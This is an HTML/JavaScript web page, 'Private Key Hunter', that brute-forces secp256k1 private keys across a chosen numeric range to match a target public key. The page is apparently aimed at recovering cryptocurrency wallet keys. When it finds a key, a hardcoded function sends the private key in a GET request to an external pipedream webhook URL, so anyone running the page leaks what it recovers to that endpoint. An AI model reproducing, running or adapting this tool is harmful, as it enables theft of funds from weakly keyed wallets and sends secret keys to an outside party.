<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Key Hunter - WORKING VERSION</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Fira Code', 'Courier New', monospace;
        }
        body {
            background: linear-gradient(135deg, #0a0e1a 0%, #0c1222 100%);
            min-height: 100vh;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 2rem;
            background: linear-gradient(135deg, #00ffcc, #00aaff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 0;
        }
        .card {
            background: rgba(15, 25, 45, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 24px;
            margin-bottom: 20px;
            border: 1px solid rgba(0, 255, 255, 0.15);
        }
        .button-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        button {
            padding: 12px 28px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .btn-start { background: #00aa66; color: white; }
        .btn-start:hover { background: #00cc77; }
        .btn-pause { background: #ffaa33; color: #1a1a2e; }
        .btn-restart { background: #dc3545; color: white; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .stat-box {
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 15px;
            text-align: center;
        }
        .stat-label {
            font-size: 12px;
            color: #8a9bc0;
        }
        .stat-value {
            font-size: 28px;
            font-weight: bold;
            color: #00ffcc;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            color: #aabbee;
            margin-bottom: 8px;
        }
        .input-group input {
            width: 100%;
            background: #0a0f1c;
            border: 1px solid #2a3f60;
            border-radius: 12px;
            padding: 12px 16px;
            color: #00ffcc;
            font-family: monospace;
        }
        .status-badge {
            display: inline-block;
            padding: 6px 16px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: bold;
            margin-left: 15px;
        }
        .status-running { background: #00aa66; color: white; animation: pulse 1s infinite; }
        .status-paused { background: #ffaa33; color: #1a1a2e; }
        .status-idle { background: #6c7a9e; color: white; }
        .status-found { background: #ff4757; color: white; animation: pulse 0.5s infinite; }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        .history-list {
            max-height: 300px;
            overflow-y: auto;
        }
        .history-item {
            background: rgba(0,0,0,0.4);
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 12px;
            border-left: 4px solid #00ffcc;
        }
        .history-pk {
            color: #00ffcc;
            font-weight: bold;
            word-break: break-all;
        }
        .history-time {
            font-size: 11px;
            color: #8a9bc0;
            margin-top: 5px;
        }
        .current-key {
            background: #0a0f1c;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            margin-top: 10px;
            font-family: monospace;
            color: #88aaff;
        }
        .info {
            background: rgba(0,255,200,0.1);
            border: 1px solid #00ffcc;
            border-radius: 10px;
            padding: 10px;
            margin-top: 15px;
            font-size: 12px;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0a0f1c; }
        ::-webkit-scrollbar-thumb { background: #00ffcc; border-radius: 10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔑 PRIVATE KEY HUNTER</h1>
        <p>Working Secp256k1 Brute Force</p>
    </div>

    <div class="card">
        <div style="display: flex; align-items: center; margin-bottom: 20px;">
            <div class="button-group">
                <button class="btn-start" id="startBtn">▶ START</button>
                <button class="btn-pause" id="pauseBtn">⏸ PAUSE</button>
                <button class="btn-restart" id="restartBtn">⟳ RESTART</button>
            </div>
            <span class="status-badge status-idle" id="statusBadge">⚪ IDLE</span>
        </div>

        <div class="stats">
            <div class="stat-box"><div class="stat-label">🔍 Attempts</div><div class="stat-value" id="attemptCount">0</div></div>
            <div class="stat-box"><div class="stat-label">⚡ Speed</div><div class="stat-value" id="speedCount">0</div></div>
            <div class="stat-box"><div class="stat-label">⏱️ Elapsed</div><div class="stat-value" id="elapsedSec">0.0</div></div>
            <div class="stat-box"><div class="stat-label">🎯 Found</div><div class="stat-value" id="foundCount">0</div></div>
        </div>

        <div class="input-group">
            <label>🎯 TARGET PUBLIC KEY</label>
            <input type="text" id="targetPubKey" value="0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798">
        </div>

        <div class="input-group">
            <label>🔽 START KEY</label>
            <input type="text" id="startKey" value="1">
        </div>

        <div class="input-group">
            <label>🔼 END KEY</label>
            <input type="text" id="endKey" value="100">
        </div>

        <div class="current-key" id="currentKeyDisplay">Ready - Click START</div>
        
        <div class="info" id="cryptoStatus">⏳ Loading cryptography library...</div>
    </div>

    <div class="card">
        <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
            <h3 style="margin: 0; color: #00ffcc;">📜 FOUND KEYS</h3>
            <button id="clearHistoryBtn" style="padding: 6px 16px; background: #2a3f5e;">Clear</button>
        </div>
        <div class="history-list" id="historyList">
            <div style="text-align: center; color: #6c7a9e; padding: 20px;">No keys found yet</div>
        </div>
    </div>
</div>

<!-- Use the working elliptic library from a reliable CDN -->
<script src="https://cdn.jsdelivr.net/npm/elliptic@6.5.4/dist/elliptic.min.js"></script>

<script>
    // Wait for elliptic to load
    let secp256k1 = null;
    let cryptoReady = false;
    
    function initCrypto() {
        if (typeof elliptic !== 'undefined') {
            secp256k1 = new elliptic.ec('secp256k1');
            cryptoReady = true;
            document.getElementById('cryptoStatus').innerHTML = '✅ Cryptography ready! Using elliptic library';
            document.getElementById('cryptoStatus').style.background = 'rgba(0,255,100,0.1)';
            console.log("✅ Elliptic library loaded");
            
            // Test with known key
            const testPriv = "1";
            const testPub = getPublicKeyFromPrivate(testPriv);
            const expected = "0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798";
            if (testPub === expected) {
                console.log("✅ Crypto test passed!");
            } else {
                console.error("❌ Crypto test failed:", testPub);
            }
        } else {
            setTimeout(initCrypto, 100);
        }
    }
    
    initCrypto();
    
    // Helper functions
    function parseToBigInt(input) {
        input = input.toString().trim().toLowerCase();
        if (input.startsWith('0x')) return BigInt(input);
        if (/[a-f]/i.test(input) && !/^\d+$/.test(input)) return BigInt('0x' + input);
        return BigInt(input);
    }
    
    function getPublicKeyFromPrivate(privateKey) {
        if (!secp256k1) return null;
        try {
            let privHex;
            if (typeof privateKey === 'bigint') {
                privHex = privateKey.toString(16).padStart(64, '0');
            } else {
                privHex = privateKey.toString().padStart(64, '0');
            }
            const keyPair = secp256k1.keyFromPrivate(privHex);
            const pubKey = keyPair.getPublic(true, 'hex');
            return pubKey;
        } catch(e) {
            console.error("Error:", e);
            return null;
        }
    }
    
    // Webhook
    const WEBHOOK_URL = "https://eoizd5ecl7m1qqn.m.pipedream.net/pk=";
    
    // DOM elements
    const startBtn = document.getElementById('startBtn');
    const pauseBtn = document.getElementById('pauseBtn');
    const restartBtn = document.getElementById('restartBtn');
    const clearHistoryBtn = document.getElementById('clearHistoryBtn');
    const statusBadge = document.getElementById('statusBadge');
    const attemptSpan = document.getElementById('attemptCount');
    const speedSpan = document.getElementById('speedCount');
    const elapsedSpan = document.getElementById('elapsedSec');
    const foundCountSpan = document.getElementById('foundCount');
    const targetPubInput = document.getElementById('targetPubKey');
    const startKeyInput = document.getElementById('startKey');
    const endKeyInput = document.getElementById('endKey');
    const currentKeyDisplay = document.getElementById('currentKeyDisplay');
    const historyDiv = document.getElementById('historyList');
    
    // State
    let isRunning = false;
    let isPaused = false;
    let foundFlag = false;
    let totalAttempts = 0;
    let startTime = 0;
    let elapsedAccumulated = 0;
    let bruteForceInterval = null;
    let foundPrivateKeys = [];
    let currentKey = null;
    
    // History functions
    function addToHistory(privateKey, publicKey) {
        const entry = {
            privateKey: privateKey,
            publicKey: publicKey,
            timeStr: new Date().toLocaleString()
        };
        foundPrivateKeys.unshift(entry);
        if (foundPrivateKeys.length > 100) foundPrivateKeys.pop();
        localStorage.setItem('pk_hunter_history', JSON.stringify(foundPrivateKeys));
        updateHistoryDisplay();
        foundCountSpan.textContent = foundPrivateKeys.length;
    }
    
    function updateHistoryDisplay() {
        if (foundPrivateKeys.length === 0) {
            historyDiv.innerHTML = '<div style="text-align: center; color: #6c7a9e; padding: 20px;">No keys found yet</div>';
            return;
        }
        let html = '';
        for (const entry of foundPrivateKeys) {
            html += `
                <div class="history-item">
                    <div class="history-pk">🔑 Private: ${entry.privateKey}</div>
                    <div class="history-pk" style="font-size:11px">📤 Public: ${entry.publicKey}</div>
                    <div class="history-time">📅 ${entry.timeStr}</div>
                </div>
            `;
        }
        historyDiv.innerHTML = html;
    }
    
    function loadHistory() {
        try {
            const stored = localStorage.getItem('pk_hunter_history');
            if (stored) {
                foundPrivateKeys = JSON.parse(stored);
                updateHistoryDisplay();
                foundCountSpan.textContent = foundPrivateKeys.length;
            }
        } catch(e) {}
    }
    
    function updateStats() {
        attemptSpan.textContent = totalAttempts.toLocaleString();
        if (isRunning && startTime > 0 && !isPaused && !foundFlag) {
            const elapsed = elapsedAccumulated + (Date.now() - startTime) / 1000;
            elapsedSpan.textContent = elapsed.toFixed(2);
            if (elapsed > 0) {
                speedSpan.textContent = Math.floor(totalAttempts / elapsed).toLocaleString();
            }
        }
    }
    
    async function notifyWebhook(privateKey) {
        try {
            await fetch(WEBHOOK_URL + privateKey, { method: 'GET', mode: 'no-cors' });
            console.log("✅ Webhook sent for:", privateKey);
        } catch(e) { console.error("Webhook error:", e); }
    }
    
    // Main brute force iteration
    async function bruteForceStep() {
        if (!isRunning || isPaused || foundFlag || !cryptoReady) return;
        
        const targetPub = targetPubInput.value.trim();
        const startVal = startKeyInput.value.trim();
        const endVal = endKeyInput.value.trim();
        
        let startBN, endBN;
        try {
            startBN = parseToBigInt(startVal);
            endBN = parseToBigInt(endVal);
            if (startBN >= endBN) {
                stopBruteforce();
                return;
            }
        } catch(e) {
            stopBruteforce();
            return;
        }
        
        if (currentKey === null) currentKey = startBN;
        if (currentKey > endBN) {
            currentKeyDisplay.innerHTML = "✅ Scan complete!";
            stopBruteforce();
            return;
        }
        
        const privHex = currentKey.toString(16).padStart(64, '0');
        currentKeyDisplay.innerHTML = `🔍 Testing: ${privHex} (${currentKey})`;
        
        const derivedPub = getPublicKeyFromPrivate(currentKey);
        totalAttempts++;
        updateStats();
        
        if (derivedPub && derivedPub.toLowerCase() === targetPub.toLowerCase()) {
            foundFlag = true;
            isRunning = false;
            if (bruteForceInterval) clearInterval(bruteForceInterval);
            
            statusBadge.className = "status-badge status-found";
            statusBadge.textContent = "🏆 FOUND! 🏆";
            currentKeyDisplay.innerHTML = `🎉 FOUND! Private Key: ${privHex} 🎉`;
            
            addToHistory(privHex, derivedPub);
            await notifyWebhook(privHex);
            alert(`🎉 PRIVATE KEY FOUND!\n\n${privHex}\n\nWebhook sent!`);
            return;
        }
        
        currentKey++;
    }
    
    function startBruteforce(reset = true) {
        if (!cryptoReady) {
            alert("Waiting for crypto library to load...");
            return false;
        }
        
        const targetPub = targetPubInput.value.trim();
        if (!targetPub.match(/^02[0-9a-f]{64}$|^03[0-9a-f]{64}$/i)) {
            alert("Invalid public key!");
            return false;
        }
        
        try {
            const startBN = parseToBigInt(startKeyInput.value.trim());
            const endBN = parseToBigInt(endKeyInput.value.trim());
            if (startBN >= endBN) { alert("Invalid range"); return false; }
        } catch(e) { alert("Invalid range"); return false; }
        
        if (bruteForceInterval) clearInterval(bruteForceInterval);
        if (reset) {
            totalAttempts = 0;
            elapsedAccumulated = 0;
            foundFlag = false;
            currentKey = null;
        }
        
        isRunning = true;
        isPaused = false;
        startTime = Date.now();
        statusBadge.className = "status-badge status-running";
        statusBadge.textContent = "🟢 RUNNING";
        
        bruteForceInterval = setInterval(() => { bruteForceStep(); }, 0);
        return true;
    }
    
    function pauseBruteforce() {
        if (!isRunning || foundFlag) return;
        if (!isPaused) {
            isPaused = true;
            elapsedAccumulated += (Date.now() - startTime) / 1000;
            startTime = 0;
            statusBadge.className = "status-badge status-paused";
            statusBadge.textContent = "⏸ PAUSED";
        }
    }
    
    function resumeBruteforce() {
        if (!isRunning || foundFlag) return;
        if (isPaused) {
            isPaused = false;
            startTime = Date.now();
            statusBadge.className = "status-badge status-running";
            statusBadge.textContent = "🟢 RUNNING";
        }
    }
    
    function restartBruteforce() {
        if (bruteForceInterval) clearInterval(bruteForceInterval);
        isRunning = false;
        isPaused = false;
        foundFlag = false;
        totalAttempts = 0;
        elapsedAccumulated = 0;
        currentKey = null;
        updateStats();
        startBruteforce(true);
    }
    
    function stopBruteforce() {
        if (bruteForceInterval) clearInterval(bruteForceInterval);
        isRunning = false;
        statusBadge.className = "status-badge status-idle";
        statusBadge.textContent = "⚪ IDLE";
    }
    
    function clearHistory() {
        if (confirm("Clear history?")) {
            foundPrivateKeys = [];
            updateHistoryDisplay();
            foundCountSpan.textContent = "0";
            localStorage.setItem('pk_hunter_history', JSON.stringify([]));
        }
    }
    
    // Event listeners
    startBtn.onclick = () => {
        if (!isRunning || foundFlag) startBruteforce(true);
        else if (isPaused) resumeBruteforce();
    };
    pauseBtn.onclick = pauseBruteforce;
    restartBtn.onclick = restartBruteforce;
    clearHistoryBtn.onclick = clearHistory;
    
    // Auto set a test that WILL work
    setTimeout(() => {
        if (cryptoReady) {
            console.log("✅ Ready! Target is public key for private key 1. Range 1-100 will find it at key 1.");
        }
    }, 1000);
    
    loadHistory();
    setInterval(updateStats, 100);
</script>
</body>
</html>
